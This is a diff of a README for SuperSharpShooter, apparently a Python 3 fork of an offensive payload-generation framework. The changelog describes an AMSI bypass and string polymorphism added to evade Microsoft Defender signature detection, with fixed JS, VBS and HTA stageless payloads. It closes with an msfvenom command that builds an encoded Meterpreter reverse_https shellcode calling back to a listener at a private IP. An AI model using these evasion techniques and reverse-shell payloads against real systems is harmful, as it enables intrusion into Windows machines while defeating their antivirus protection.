@@ -1,13 +1,17 @@
-Forking... and fixing a couple of things.
+
+It's a fork that has set many things in stone.
 
 What's new:
 1. Fixed the amsiEnable bypass to use the filelocation-independent version
-2. Added polymorphism to the string "SharpShooter", which was popping Defender signature-based detections.  This is enabled by default in this version.  If you want it disabled, by all means... comment out in SuperSharpShooter.py:507 : 
-    x.template_code = x.fix_hardcode(x.template_code, x.code_type)
-3. Fixed .NET v4 js, vbs, hta sharpshooterv4 and stagelessv4
-4. Ported to python3
+2. Added polymorphism to the string "SharpShooter", which was popping Defender signature-based detections.
+    `template_code = fix_hardcode(template_code, code_type)`
+3. Fixed `.NET v4` `js`, `vbs`, `hta` sharpshooterv4 and stagelessv4
+4. Ported to `python3`
 
-I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi bypass and defender bypass works (at least at this time).  Can also confirm HTML smuggling stageless works.
+Easy install:
+```shell
+pipx install 'git+https://github.com/SYANiDE-/SuperSharpShooter.git'
+```
 
 ### Generate the shellcodes
     msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
